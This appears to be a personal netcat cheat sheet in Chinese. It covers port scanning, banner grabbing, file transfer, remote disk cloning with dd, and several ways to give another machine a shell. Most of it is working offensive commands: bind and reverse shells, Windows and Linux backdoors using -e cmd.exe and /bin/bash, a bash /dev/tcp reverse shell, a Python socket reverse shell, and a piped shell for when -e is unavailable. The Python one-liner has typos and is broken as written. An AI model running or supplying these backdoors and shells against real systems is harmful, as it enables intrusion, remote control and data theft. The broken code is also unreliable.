#Netcat 無法正常下載就裡用nc傳輸
```php
connecting listening
bind shells
reverse shells
>> PortScan
nc -nv <rhost> // port scan TCP
nc -nvv -w1 -z <rhost> 3388-3390

nc -vvn -u -z  <rhost> // port scan UDP
nc -nvlp <rhost>// listening

-n  // ip address  不對目標DNS解析 
-v  // verbose 錯誤訊息也詳細輸出use -vv get more
-p  // 指定port
-l  // 開始監聽
-L  // 當客戶端斷開依舊等待狀態
-u  // use UDP mode 被過濾時使用
-o  // 16位元制的數據傳輸設定
-w  // 超時設定
-t  // telnet應答?
-z  // 直接顯示結果 加速掃描 不使用任何的payload
-d  // 背景執行 後門建立過程
-e  // 執行特定程式 後門建立過程
-G  gateway// 用於突破內網限制
-g num  //路由跳數
-i sec  //每一行數據發送間隔

-r  // 隨機化端口號設定
-s addr // 源地址設定 隱藏真實來源地址
-t  // telent請求數據包回覆設定

抓取banner
echo " "| nc -vn -w1 <rhost> <rport>

 
```
加密傳輸文件
```php
yum install mcrypy
# nc -lp 6666 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.jpg     //監聽接收
# mcrypt --flush -Fbq -a rijndael-256 -m ecb < 1.jpg | nc -nc <Lhotst:6666> -q 1    //傳送文件
--flush 立即冲洗输出，
-F 输出数据，-b 不保留算法信息，-q 关闭一些非严重的警告，-d 解密
```
Remote clone disk
```php
// 借助 dd 命令，首先通过 nc 监听一个端口，然后通过 dd 指定要clone的分区，dd 的 of 参数相当于一个复制功能
nc -lp 6666 | dd of=/dev/sda
dd if=/dev/sda | nc -nv 192.168.228.128 6666 -q 1
```
```
reves shell
#server site
nc -l ip <localport> -e cmd.exe
#client site
nc <rhost><rport>

傳輸文件
#server site
nc -l -p <lport> > outfile 
#client site
nc <rhost><rport> < <path:infile>

#server site
nc -l -p <lport> < <path:infile>
#client site
nc <rhost><rport> > outfile
nc -w3 <rhost><rport>  //只等待三秒

```
後門？
```php
windows
監聽後門
nc -l -p 4444 -e cmd.exe
連接行後門
#s
nc -l -p 4444
#client
nc <rhost><rport> -e cmd.exe
dir       // 查看當前目錄檔案
ipconfig  // 查看網卡根 資料
＃＃＃無論什麼後面都要 -e cmd.exe回應 cmd

linux
監聽後門
nc -l -p 4444 -e /bin/bash

連接行後門
nc <rhost><rport> -e /bin/bash
＃＃＃無論什麼後面都要 -e /bin/bash回應 shell

```
轉接轉發內網
```php
當Rhost連接Lhost，連接的Rhost通Lhost連結Rport的轉法成功
 echo nc <Rhost><Rport> > delay.bat
 nc -l -p <Lport> -e delay.bat
-e 執行
delay.bat 在批次檔裡面執行特定指令
ex: nc64.exe <host ip+port>

```
反彈shell 在對方沒安裝 nc
```php
server site LL
nc -lvp port
# nc -lvp 4445
client site RR
bash -i >& /dev/tcp/<ip>/<port> 0>&1
# bash -i >& /dev/tcp/<Lip>/4445 0>&1

###python  反彈shell
rhost
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Rip',Rport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subproess.call(['/bin/bash','-i]);"
/// import os,socket,subprocess 導入三個模組
///s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 聲明一個TCP,使用AF_INET
///connect(('Rip',Rport)) 連接到rohost+port
///s.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2) 遠端文件描述符 標準輸入輸出 錯誤輸出指向lhost．使用os庫的dup2
///p=subproess.call(['/bin/bash','-i]); 傳入參數-i啟動bash交互模組

lhost
nc -lvp port
```
當不支援 -e情境 因防火牆阻擋
```php
-e  // 執行特定程式 後門建立過程
nc ip port | /bin/bash | nc ip port

pc site lhost
nc -lvnp port1  //input
nc -lvnp port2  //output
Rhost site
nc -lvnp port1 | /bin/bash | nc ip port2


inode存放屬性指向block存在內容
```

